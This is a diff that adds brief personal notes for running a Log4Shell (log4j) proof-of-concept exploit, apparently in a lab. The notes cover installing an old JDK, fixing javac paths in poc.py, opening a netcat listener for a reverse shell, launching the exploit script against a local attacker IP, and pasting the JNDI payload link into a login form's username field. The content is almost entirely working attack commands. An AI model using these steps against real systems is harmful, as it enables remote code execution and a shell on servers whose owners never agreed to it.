@@ -1,0 +1,21 @@
+cd log4j-shell-poc/
+
+tar -xf jdk-8u202-linux-x64.tar.gz
+
+mv jdk1.8.0_202 /usr/bin/
+
+back to log4j-shell-poc directory
+
+pluma poc.py
+
+fing and replace
+jdk1.8.0.20/bin/javac to /usr/bin/jdk1.8.0_202/bin/javac (line 62, 87, 99)
+
+
+new term
+
+nc -lvp 9001
+
+python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
+
+paste the jndi link on the user name optiona nd fill password
